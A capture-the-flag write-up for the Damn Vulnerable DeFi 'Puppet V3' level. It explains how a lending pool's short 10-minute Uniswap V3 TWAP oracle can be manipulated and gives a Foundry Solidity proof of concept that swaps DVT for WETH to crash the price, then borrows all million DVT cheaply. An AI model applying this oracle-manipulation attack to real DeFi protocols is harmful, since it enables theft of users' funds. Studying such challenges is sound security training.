# Puppet V3

Bear or bull market, true DeFi devs keep building. Remember that lending pool you helped? A new version is out.

They’re now using Uniswap V3 as an oracle. That’s right, no longer using spot prices! This time the pool queries the time-weighted average price of the asset, with all the recommended libraries.

The Uniswap market has 100 WETH and 100 DVT in liquidity. The lending pool has a million DVT tokens.

Starting with 1 ETH and some DVT, you must save all from the vulnerable lending pool. Don't forget to send them to the designated recovery account.

_NOTE: this challenge requires a valid RPC URL to fork mainnet state into your local environment._

# Challenge overview

[official site](https://www.damnvulnerabledefi.xyz/challenges/puppet-v3/)  
I am trying to reduce fluffs and indirect stuffs as much as posible

## Let’s dive

The Puppet_V3 challenge is the 14th level in the Damn Vulnerable DeFi V4 series. The goal is simple: Drain all the DVT tokens from the pool.

## Vulnerability
The `PuppetV3Pool.sol` contract uses a 10-minute TWAP period to calculate the price of DVT tokens. This setup makes the contract vulnerable to price manipulation attacks without much cost! With this method, we can exchange the 110 DVT tokens we own for WETH, making DVT tokens incredibly cheap. The oracle calculates the current price based on price data from the past 10 minutes. However, because the TWAP period is short, by making large trades within this 10-minute window (such as swapping a large amount of DVT), the price can be significantly manipulated.
> Reference : SunWeb3Sec

## Attack Method 
    1) Send your all DVT tokens to uniSwapPool and swap it with ETH
    2) Now, the price will get inflated so much that you can borrow all DVTS for just 0.15 ether
    3) Borrow all the tokens
    4) Send all the tokens to the recovery account
   
## POC :

``` solidity
    function test_puppetV3() public checkSolvedByPlayer {
        address uniswapRouterAddress = 0xE592427A0AEce92De3Edee1F18E0157C05861564;
        token.approve(uniswapRouterAddress, type(uint256).max);

        ISwapRouter(uniswapRouterAddress).exactInputSingle(
        ISwapRouter.ExactInputSingleParams({
            tokenIn: address(token),
            tokenOut: address(weth),
            fee: 3000,
            recipient: address(player),
            deadline: block.timestamp,
            amountIn: PLAYER_INITIAL_TOKEN_BALANCE,
            amountOutMinimum: 0,
            sqrtPriceLimitX96: 0
            })
        );
        vm.warp(block.timestamp + 114);
        uint256 quote = lendingPool.calculateDepositOfWETHRequired(LENDING_POOL_INITIAL_TOKEN_BALANCE);
        
        weth.approve(address(lendingPool), quote);
        lendingPool.borrow(1_000_000e18);

        (bool pwned,) = address(token).call(
            abi.encodeWithSignature(
                "transfer(address,uint256)",
                recovery, 1_000_000e18
            )
        );

        require(pwned, "Ahh bruh! u fucked up at last step dude!");
    }
```

run `forge test --mt test_puppetV3 -vvvv` to see the magic :).

>Okay! This Much 

### If you found this write up useful give a star to the **[repo](https://github.com/0xscarfac3/damnvulnerabledefi-v4-solutions)** and don't forget to follow your buddy **[0xscarfac3](https://github.com/0xscarfac3)**